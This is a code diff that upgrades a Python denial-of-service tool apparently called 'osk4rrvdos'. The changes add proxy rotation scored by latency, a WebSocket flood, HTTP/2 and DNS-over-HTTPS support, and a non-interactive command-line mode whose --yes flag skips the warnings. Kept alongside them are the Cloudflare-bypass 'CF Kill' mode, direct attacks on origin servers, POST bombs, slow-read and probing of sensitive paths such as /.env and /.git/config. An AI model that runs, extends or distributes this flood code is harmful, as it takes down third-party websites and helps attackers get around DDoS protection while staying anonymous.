@@ -11,9 +11,25 @@ import threading
 import base64
 import json
 import msvcrt
+import argparse
+import configparser
+import uuid
+import hashlib
 from collections import deque
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin, urlencode
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
+try:
+    import h2
+    H2_AVAILABLE = True
+except ImportError:
+    H2_AVAILABLE = False
+
+try:
+    import aiohttp_socks
+    SOCKS_AVAILABLE = True
+except ImportError:
+    SOCKS_AVAILABLE = False
 
 PROXY_SOURCES = [
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
@@ -160,17 +176,23 @@ UA_LIST = [
 ]
 
 PRIMARY_PATHS = ["/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
-                 "/index.html", "/index.php", "/home"]
-SECONDARY_PATHS = ["/about", "/contact", "/login", "/signup",
-                   "/api/v1/users", "/api/v2/status", "/api/health",
-                   "/api/v1/", "/api/v2/", "/api/users", "/api/products"]
+                 "/index.html", "/index.php", "/home", "/main", "/default"]
+SECONDARY_PATHS = ["/about", "/contact", "/login", "/signup", "/register",
+                   "/api/v1/users", "/api/v2/status", "/api/health", "/api/v1/test",
+                   "/api/v1/", "/api/v2/", "/api/users", "/api/products", "/api/items",
+                   "/cart", "/checkout", "/search", "/upload", "/feed", "/rss"]
 FUZZ_PATHS = ["/graphql", "/wp-admin/", "/wp-login.php", "/wp-json/wp/v2/users",
-              "/admin/", "/search?q={}", "/dashboard", "/panel",
-              "/.env", "/.git/config", "/.well-known/security.txt",
+              "/admin/", "/search?q={}", "/dashboard", "/panel", "/console",
+              "/.env", "/.git/config", "/.well-known/security.txt", "/.dockerenv",
               "/wp-content/plugins/", "/wp-content/themes/",
-              "/server-status", "/phpinfo.php", "/info.php",
-              "/api/v3/auth", "/oauth/token", "/cpanel", "/webmail",
-              "/api/orders", "/api/graphql"]
+              "/server-status", "/phpinfo.php", "/info.php", "/xdebuginfo",
+              "/api/v3/auth", "/oauth/token", "/cpanel", "/webmail", "/whm",
+              "/api/orders", "/api/graphql", "/api/v1/graphql", "/api/v2/graphql",
+              "/ws", "/websocket", "/socket.io/", "/signalr", "/sockjs-node",
+              "/api/messages", "/api/notifications", "/api/events", "/api/feed",
+              "/api/v1/upload", "/api/v2/upload", "/upload", "/files", "/assets",
+              "/api/v1/login", "/api/v1/register", "/api/v1/forgot-password"]
+WEBSOCKET_PATHS = ["/ws", "/websocket", "/socket.io/", "/signalr", "/ws/chat", "/ws/data"]
 
 HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH", "DELETE"]
 
@@ -324,6 +346,11 @@ total_429 = 0
 total_503 = 0
 adaptive_cooldown = False
 
+# Latency and success rate tracking
+latency_times = deque(maxlen=200)
+total_bytes_sent = 0
+total_bytes_recv = 0
+
 cf_kill = False
 origin_ips = []
 direct_origin = False
@@ -335,25 +362,92 @@ cf_subdomains_found = 0
 cf_origin_target = None
 connection_errors = 0
 
+# 1000x upgrade config globals
+force_close_conns = False
+use_http2 = False
+enable_websocket = False
+dns_over_https = False
+config_file = None
+command_line_args = None
+
 def gen_ip():
     r = random.randint
     return f"{r(1,223)}.{r(0,255)}.{r(0,255)}.{r(1,254)}"
 
+class ProxyManager:
+    def __init__(self):
+        self.proxies = {}
+        self.order = []
+        self.index = 0
+        self.lock = threading.Lock()
+
+    def load(self, proxy_list):
+        with self.lock:
+            for p in proxy_list:
+                clean = p.replace("http://", "").replace("https://", "").strip()
+                if clean and clean not in self.proxies:
+                    self.proxies[clean] = {"score": 100, "fails": 0, "latency": 1.0, "last_used": 0}
+                    self.order.append(clean)
+
+    def next(self, prefer_fast=False):
+        with self.lock:
+            if not self.order:
+                return None
+            if prefer_fast and len(self.order) > 10:
+                candidates = [p for p in self.order if self.proxies[p]["score"] > 50]
+                if candidates:
+                    candidates.sort(key=lambda p: self.proxies[p]["latency"])
+                    p = candidates[0]
+                    self.proxies[p]["last_used"] = time.time()
+                    return f"http://{p}"
+            for _ in range(len(self.order)):
+                p = self.order[self.index % len(self.order)]
+                self.index = (self.index + 1) % len(self.order)
+                if self.proxies[p]["score"] > 0:
+                    self.proxies[p]["last_used"] = time.time()
+                    return f"http://{p}"
+            return None
+
+    def report(self, proxy_str, success, latency=0.0):
+        clean = proxy_str.replace("http://", "").replace("https://", "").strip()
+        with self.lock:
+            if clean not in self.proxies:
+                return
+            info = self.proxies[clean]
+            if success:
+                info["fails"] = max(0, info["fails"] - 1)
+                info["score"] = min(200, info["score"] + 5)
+                if latency > 0:
+                    info["latency"] = info["latency"] * 0.8 + latency * 0.2
+            else:
+                info["fails"] += 1
+                info["score"] -= 25
+                if info["fails"] >= 3 or info["score"] <= 0:
+                    info["score"] = 0
+                    if clean in self.order:
+                        self.order.remove(clean)
+                        self.proxies.pop(clean, None)
+
+proxy_manager = ProxyManager()
+
 def next_proxy():
-    global proxy_index
+    if proxy_mode and proxy_manager.order:
+        return proxy_manager.next(prefer_fast=boost_mode)
     if not proxy_pool:
         return None
+    global proxy_index
     with proxy_lock:
         p = proxy_pool[proxy_index % len(proxy_pool)]
         proxy_index = (proxy_index + 1) % len(proxy_pool)
         return f"http://{p}"
 
 def remove_bad_proxy(proxy_str):
-    global proxy_pool, proxy_alive
-    clean = proxy_str.replace("http://", "")
+    proxy_manager.report(proxy_str, False, 0.0)
+    clean = proxy_str.replace("http://", "").replace("https://", "").strip()
     with proxy_lock:
         if clean in proxy_pool:
             proxy_pool.remove(clean)
+            global proxy_alive
             proxy_alive = len(proxy_pool)
             _save_proxy_cache()
 
@@ -452,7 +546,7 @@ def show_banner():
 
 def print_live():
     global total_sent, total_failed, total_success, last_http_code, last_code_label, req_rate, stopped
-    global proxy_mode, proxy_alive, bypass_active
+    global proxy_mode, proxy_alive, bypass_active, latency_times, total_bytes_sent, total_bytes_recv
     if stopped:
         return
     os.system("cls" if os.name == "nt" else "clear")
@@ -474,9 +568,13 @@ def print_live():
     pb_str = "Yes" if post_bomb else "No"
     sr_str = "Yes" if slow_read else "No"
     as_str = "Yes" if adaptive_scaling else "No"
+    h2_str = "Yes" if use_http2 else "Auto"
+    ws_str = "Yes" if enable_websocket else "No"
+    avg_lat = sum(latency_times) / len(latency_times) if latency_times else 0.0
+    success_rate = (total_success / total_sent * 100) if total_sent else 0.0
     safe_print(f" Request sent      : {total_sent}")
     safe_print(f" Request failed    : {total_failed}")
-    safe_print(f" Request success   : {total_success}")
+    safe_print(f" Request success   : {total_success} ({success_rate:.1f}%)")
     safe_print(f" Proxy             : {px_str}")
     safe_print(f" Bypass            : {bp_str}")
     safe_print(f" Boost             : {bt_str}")
@@ -484,12 +582,17 @@ def print_live():
     safe_print(f" POST bomb         : {pb_str}")
     safe_print(f" Slow read         : {sr_str}")
     safe_print(f" Adaptive scaling  : {as_str}")
+    safe_print(f" HTTP/2            : {h2_str}")
+    safe_print(f" WebSocket flood   : {ws_str}")
     safe_print(f" Sessions          : {session_count}")
     safe_print(f" Request rate      : {req_rate:.1f} req/s")
     safe_print(f" Peak RPS          : {peak_rps:.1f}")
+    safe_print(f" Avg latency       : {avg_lat*1000:.1f} ms")
     safe_print(f" GET / POST / HEAD : {total_get_sent} / {total_post_sent} / {total_head_sent}")
     safe_print(f" 429 / 503         : {total_429} / {total_503}")
     safe_print(f" Conn errors       : {connection_errors}")
+    safe_print(f" Bytes sent        : {total_bytes_sent / 1024 / 1024:.1f} MB")
+    safe_print(f" Bytes recv        : {total_bytes_recv / 1024 / 1024:.1f} MB")
     if cf_kill:
         cf_str = "ACTIVE"
         do_str = f"Yes / {cf_origin_found} IPs" if direct_origin else "No"
@@ -639,7 +742,25 @@ def validate_proxies_background(proxies, test_url):
     proxy_validate_result = ([], 0)
     threading.Thread(target=_run_proxy_validation, args=(proxies, test_url), daemon=True).start()
 
-def resolve_dns(host):
+def resolve_dns(host, doh=False):
+    if doh or dns_over_https:
+        try:
+            providers = ["https://dns.google/resolve", "https://cloudflare-dns.com/dns-query",
+                         "https://dns.quad9.net:5053/dns-query"]
+            provider = random.choice(providers)
+            params = {"name": host, "type": "A"}
+            headers = {"Accept": "application/dns-json"}
+            import urllib.request
+            url = f"{provider}?{urlencode(params)}"
+            req = urllib.request.Request(url, headers=headers)
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                data = json.loads(resp.read().decode())
+                answers = data.get("Answer", [])
+                ips = [a["data"] for a in answers if a.get("type") == 1]
+                if ips:
+                    return ips
+        except Exception:
+            pass
     ips = set()
     try:
         for _, _, _, _, addr in socket.getaddrinfo(host, 80, socket.AF_INET, socket.SOCK_STREAM):
@@ -1058,6 +1179,7 @@ async def attack_worker(session, url_obj, host, tid):
     global total_proxy_used, total_direct_used, proxy_alive
     global total_post_sent, total_get_sent, total_head_sent, total_429, total_503, adaptive_cooldown
     global cf_bypass_count, cf_origin_target, connection_errors
+    global latency_times, total_bytes_sent, total_bytes_recv
 
     scheme = url_obj.scheme
     netloc = url_obj.netloc
@@ -1083,6 +1205,43 @@ async def attack_worker(session, url_obj, host, tid):
             target = f"{scheme}://{netloc}{path}"
 
         proxy = next_proxy() if proxy_mode else None
+
+        # WebSocket flood attack vector
+        if enable_websocket and random.random() < 0.25:
+            try:
+                ws_path = random.choice(WEBSOCKET_PATHS)
+                if cf_kill and direct_origin and origin_ips:
+                    ws_target = f"{scheme.replace('http', 'ws')}://{origin_ip}{ws_path}"
+                else:
+                    ws_target = f"{scheme.replace('http', 'ws')}://{netloc}{ws_path}"
+                async with session.ws_connect(ws_target, headers=headers, proxy=proxy,
+                                              timeout=aiohttp.ClientTimeout(total=2),
+                                              protocols=["chat", "binary", "super"],
+                                              autoping=False) as ws:
+                    for _ in range(random.randint(3, 10)):
+                        if random.random() > 0.5:
+                            await ws.send_str(gen_payload(random.randint(50, 400)))
+                        else:
+                            await ws.send_bytes(random.randbytes(random.randint(64, 512)))
+                        await asyncio.sleep(0.001)
+                with lock:
+                    total_sent += 1
+                    total_success += 1
+                    if method == "GET":
+                        total_get_sent += 1
+                    elif method == "POST":
+                        total_post_sent += 1
+                    elif method == "HEAD":
+                        total_head_sent += 1
+                rate_times.append(time.time())
+                if adaptive_cooldown:
+                    await asyncio.sleep(random.uniform(0.001, 0.005))
+                    adaptive_cooldown = False
+                elif boost_mode:
+                    await asyncio.sleep(random.uniform(0.0001, 0.002))
+                continue
+            except Exception:
+                pass
 
         post_data = None
         if method in ("POST", "PUT", "PATCH") and (post_bomb or multi_method):
@@ -1125,8 +1284,10 @@ async def attack_worker(session, url_obj, host, tid):
                                   timeout=aiohttp.ClientTimeout(total=3),
                                   allow_redirects=True)
 
+            start_ts = time.time()
             async with ctx as resp:
                 code = resp.status
+                body = b""
 
                 if slow_read and not boost_mode and resp.content_length and resp.content_length > 0:
                     try:
@@ -1139,9 +1300,14 @@ async def attack_worker(session, url_obj, host, tid):
                     except Exception:
                         pass
                 else:
-                    await resp.read()
+                    body = await resp.read()
 
+                latency = time.time() - start_ts
                 with lock:
+                    latency_times.append(latency)
+                    total_bytes_recv += len(body)
+                    if post_data:
+                        total_bytes_sent += len(post_data.encode() if isinstance(post_data, str) else post_data)
                     total_sent += 1
                     last_http_code = code
                     last_code_label = code_label(code)
@@ -1153,8 +1319,12 @@ async def attack_worker(session, url_obj, host, tid):
                         total_success += 1
                         if cf_kill:
                             cf_bypass_count += 1
+                        if proxy:
+                            proxy_manager.report(proxy, True, latency)
                     else:
                         total_failed += 1
+                        if proxy:
+                            proxy_manager.report(proxy, False, latency)
                     if method == "GET":
                         total_get_sent += 1
                     elif method == "POST":
@@ -1218,9 +1388,10 @@ async def attack_worker(session, url_obj, host, tid):
         else:
             await asyncio.sleep(random.uniform(profile["delay_min"], profile["delay_max"]))
 
-def _browser_ssl_context():
+def _browser_ssl_context(force_h2=False):
     try:
         ctx = ssl.create_default_context()
+        ctx.minimum_version = getattr(ssl.TLSVersion, 'TLSv1_2', ssl.TLSVersion.MINIMUM_SUPPORTED)
         try:
             ctx.set_ciphers(
                 "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:"
@@ -1230,6 +1401,13 @@ def _browser_ssl_context():
             pass
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
+        if force_h2 and H2_AVAILABLE:
+            ctx.set_alpn_protocols(["h2", "http/1.1"])
+        else:
+            try:
+                ctx.set_alpn_protocols(["http/1.1", "h2"])
+            except Exception:
+                pass
         return ctx
     except Exception:
         return False
@@ -1238,7 +1416,7 @@ def _browser_ssl_context():
 async def http_attack(url, host, conns):
     global peak_rps, adaptive_cooldown
     parsed = urlparse(url)
-    ssl_ctx = _browser_ssl_context() if parsed.scheme == "https" else False
+    ssl_ctx = _browser_ssl_context(force_h2=H2_AVAILABLE) if parsed.scheme == "https" else False
 
     sessions = []
     all_tasks = []
@@ -1248,7 +1426,7 @@ async def http_attack(url, host, conns):
             ssl=ssl_ctx,
             limit=conns * 3,
             limit_per_host=0,
-            force_close=False,
+            force_close=force_close_conns,
             enable_cleanup_closed=True,
             ttl_dns_cache=300,
             keepalive_timeout=30,
@@ -1336,11 +1514,24 @@ def wait_for_proxy_validation(initial_msg=True):
     safe_print(f"\r< / > {fast} fast | {slow} filtered" + " " * 20)
     return valid
 
+def _bool_or_prompt(cli_val, prompt_text, interactive=True):
+    if cli_val is not None:
+        return bool(cli_val)
+    if not interactive:
+        return False
+    return prompt_yn(prompt_text)
+
 def main():
     global running, bypass_active, proxy_mode, proxy_pool, proxy_alive, last_http_code, last_code_label, stopped
     global known_good_paths, total_proxy_used, total_direct_used
     global boost_mode, multi_method, post_bomb, slow_read, adaptive_scaling, payload_size, session_count
     global cf_kill, direct_origin, origin_ips, cf_origin_found, cf_subdomains_found, cf_origin_target
+    global use_http2, enable_websocket, force_close_conns, command_line_args
+
+    interactive = True
+    cli = getattr(sys.modules[__name__], "command_line_args", None)
+    if cli:
+        interactive = not cli.target
 
     try:
         show_banner()
@@ -1351,6 +1542,8 @@ def main():
     safe_print("</> Python version detected:", sys.version.split()[0])
     safe_print("</> aiohttp:", aiohttp.__version__)
     safe_print("</> Libraries loaded")
+    safe_print("</> HTTP/2 support:", "YES" if H2_AVAILABLE else "Install h2")
+    safe_print("</> SOCKS support:", "YES" if SOCKS_AVAILABLE else "Install aiohttp-socks")
     safe_print("</> Official download only from github.com/osk4rrv/osk4rrvdos")
     safe_print("</> Created by @osk4rrv")
     safe_print("")
@@ -1358,9 +1551,20 @@ def main():
     safe_print(" [!] Your IP WILL be exposed unless you use VPN / proxy.")
     safe_print(" [!] Pro-Tips: Cloudflare WARP | Tor (127.0.0.1:9050) | Mullvad VPN")
     safe_print(" [!] Use ONLY on targets you own or have explicit permission to test.")
-    resp = input(" Press ENTER to continue (Ctrl+C to exit): ")
 
-    target = input("\n[osk4rrvdos] url > ").strip()
+    if cli:
+        if cli.config:
+            cfg = load_config(cli.config)
+            safe_print(f"< / > Loaded config from {cli.config}")
+        if not cli.yes and not cli.target:
+            input(" Press ENTER to continue (Ctrl+C to exit): ")
+    else:
+        input(" Press ENTER to continue (Ctrl+C to exit): ")
+
+    if cli and cli.target:
+        target = cli.target.strip()
+    else:
+        target = input("\n[osk4rrvdos] url > ").strip()
     if not target:
         safe_print("[-] No target provided")
         any_key()
@@ -1373,37 +1577,56 @@ def main():
     scheme = parsed.scheme
     port = parsed.port or (443 if scheme == "https" else 80)
 
-    proxy_mode = prompt_yn("\n[osk4rrvdos] Proxy attack [y/n]: ")
-    bypass_active = prompt_yn("[osk4rrvdos] Bypass [y/n]: ")
-    boost_mode = prompt_yn("[osk4rrvdos] Boost mode [y/n]: ")
-    multi_method = prompt_yn("[osk4rrvdos] Multi-method [y/n]: ")
-    post_bomb = prompt_yn("[osk4rrvdos] POST bomb [y/n]: ")
-    slow_read = prompt_yn("[osk4rrvdos] Slow read [y/n]: ")
-    adaptive_scaling = prompt_yn("[osk4rrvdos] Adaptive scaling [y/n]: ")
-    cf_kill = prompt_yn("[osk4rrvdos] CF Kill mode [y/n]: ")
+    proxy_mode = _bool_or_prompt(cli.proxy if cli else None, "\n[osk4rrvdos] Proxy attack [y/n]: ", interactive)
+    bypass_active = _bool_or_prompt(cli.bypass if cli else None, "[osk4rrvdos] Bypass [y/n]: ", interactive)
+    boost_mode = _bool_or_prompt(cli.boost if cli else None, "[osk4rrvdos] Boost mode [y/n]: ", interactive)
+    multi_method = _bool_or_prompt(cli.multi_method if cli else None, "[osk4rrvdos] Multi-method [y/n]: ", interactive)
+    post_bomb = _bool_or_prompt(cli.post_bomb if cli else None, "[osk4rrvdos] POST bomb [y/n]: ", interactive)
+    slow_read = _bool_or_prompt(cli.slow_read if cli else None, "[osk4rrvdos] Slow read [y/n]: ", interactive)
+    adaptive_scaling = _bool_or_prompt(cli.adaptive if cli else None, "[osk4rrvdos] Adaptive scaling [y/n]: ", interactive)
+    cf_kill = _bool_or_prompt(cli.cf_kill if cli else None, "[osk4rrvdos] CF Kill mode [y/n]: ", interactive)
 
     if cf_kill:
-        direct_origin = prompt_yn("[osk4rrvdos] Direct origin attack (bypass CF proxy) [y/n]: ")
+        direct_origin = _bool_or_prompt(cli.direct_origin if cli else None, "[osk4rrvdos] Direct origin attack (bypass CF proxy) [y/n]: ", interactive)
 
-    if boost_mode or post_bomb or multi_method:
-        try:
-            ps_input = input("[osk4rrvdos] Payload size (KB, default=1): ").strip()
-            payload_size = int(ps_input) * 1024 if ps_input else 1024
-        except ValueError:
+    use_http2 = bool(cli.http2 if cli else False)
+    enable_websocket = bool(cli.websocket if cli else False)
+    force_close_conns = bool(cli.force_close if cli else False)
+
+    if cli and cli.payload_size:
+        payload_size = cli.payload_size * 1024
+    elif boost_mode or post_bomb or multi_method:
+        if interactive:
+            try:
+                ps_input = input("[osk4rrvdos] Payload size (KB, default=1): ").strip()
+                payload_size = int(ps_input) * 1024 if ps_input else 1024
+            except ValueError:
+                payload_size = 1024
+        else:
             payload_size = 1024
 
-    if boost_mode:
-        try:
-            sc_input = input("[osk4rrvdos] Session count (default=3): ").strip()
-            session_count = int(sc_input) if sc_input else 3
-        except ValueError:
+    if cli and cli.sessions:
+        session_count = cli.sessions
+    elif boost_mode:
+        if interactive:
+            try:
+                sc_input = input("[osk4rrvdos] Session count (default=3): ").strip()
+                session_count = int(sc_input) if sc_input else 3
+            except ValueError:
+                session_count = 3
+        else:
             session_count = 3
 
     if not proxy_mode:
         safe_print("\n [!] WARNING: Direct mode — your real IP WILL be visible!")
         safe_print(" [!] Use VPN (Cloudflare WARP / Mullvad) or Tor.")
-        if not prompt_yn("[osk4rrvdos] Continue anyway? [y/n]: "):
-            return
+        if not cli or not cli.yes:
+            if interactive:
+                if not prompt_yn("[osk4rrvdos] Continue anyway? [y/n]: "):
+                    return
+            else:
+                safe_print("[!] Use --yes to skip warnings in non-interactive mode")
+                return
 
     safe_print(f"\n[*] Target: {scheme}://{host}:{port}")
 
@@ -1492,6 +1715,7 @@ def main():
                 if valid:
                     proxy_pool = valid
                     proxy_alive = len(proxy_pool)
+                    proxy_manager.load(proxy_pool)
                     _save_proxy_cache()
                     safe_print(f"< / > {proxy_alive} validated proxies ready")
                 else:
@@ -1598,15 +1822,20 @@ def main():
     safe_print("\n[. . .] Stopping...")
     time.sleep(0.5)
 
+    success_rate = (total_success / total_sent * 100) if total_sent else 0.0
+    avg_lat = sum(latency_times) / len(latency_times) if latency_times else 0.0
     safe_print(f"\n [+] Attack finished")
     safe_print(f"     Request sent    : {total_sent}")
-    safe_print(f"     Request success : {total_success}")
+    safe_print(f"     Request success : {total_success} ({success_rate:.1f}%)")
     safe_print(f"     Request failed  : {total_failed}")
     safe_print(f"     Proxy routed    : {total_proxy_used}")
     safe_print(f"     Direct routed   : {total_direct_used}")
     safe_print(f"     GET / POST / HEAD: {total_get_sent} / {total_post_sent} / {total_head_sent}")
     safe_print(f"     429 / 503       : {total_429} / {total_503}")
     safe_print(f"     Conn errors     : {connection_errors}")
+    safe_print(f"     Avg latency     : {avg_lat*1000:.1f} ms")
+    safe_print(f"     Bytes sent      : {total_bytes_sent / 1024 / 1024:.1f} MB")
+    safe_print(f"     Bytes recv      : {total_bytes_recv / 1024 / 1024:.1f} MB")
     safe_print(f"     Peak RPS        : {peak_rps:.1f}")
     if cf_kill:
         safe_print(f"     CF Kill         : ACTIVE")
@@ -1617,8 +1846,44 @@ def main():
             safe_print(f"     Direct origin   : {cf_origin_target}")
     any_key()
 
+def parse_args():
+    parser = argparse.ArgumentParser(description="osk4rrvdos - network stress testing tool")
+    parser.add_argument("target", nargs="?", help="Target URL")
+    parser.add_argument("--proxy", "-p", action="store_true", help="Use proxy mode")
+    parser.add_argument("--bypass", "-b", action="store_true", help="Enable bypass")
+    parser.add_argument("--boost", "-B", action="store_true", help="Enable boost mode")
+    parser.add_argument("--multi-method", "-m", action="store_true", help="Enable multi-method")
+    parser.add_argument("--post-bomb", "-P", action="store_true", help="Enable POST bomb")
+    parser.add_argument("--slow-read", "-s", action="store_true", help="Enable slow read")
+    parser.add_argument("--adaptive", "-a", action="store_true", help="Enable adaptive scaling")
+    parser.add_argument("--cf-kill", "-c", action="store_true", help="Enable CF Kill mode")
+    parser.add_argument("--direct-origin", "-d", action="store_true", help="Enable direct origin attack")
+    parser.add_argument("--http2", "-2", action="store_true", help="Force HTTP/2 where supported")
+    parser.add_argument("--websocket", "-w", action="store_true", help="Enable WebSocket flood")
+    parser.add_argument("--force-close", "-f", action="store_true", help="Force close connections after each request")
+    parser.add_argument("--payload-size", type=int, default=1, help="Payload size in KB")
+    parser.add_argument("--sessions", type=int, default=3, help="Number of sessions")
+    parser.add_argument("--conns", type=int, default=0, help="Connections per session (0=auto)")
+    parser.add_argument("--config", "-C", type=str, help="Config file path")
+    parser.add_argument("--yes", "-y", action="store_true", help="Skip warnings")
+    return parser.parse_args()
+
+def load_config(path):
+    cfg = configparser.ConfigParser()
+    if not os.path.isfile(path):
+        return {}
+    try:
+        cfg.read(path)
+        data = {}
+        if cfg.has_section("main"):
+            data = dict(cfg.items("main"))
+        return data
+    except Exception:
+        return {}
+
 if __name__ == "__main__":
     try:
+        command_line_args = parse_args()
         main()
     except KeyboardInterrupt:
         pass
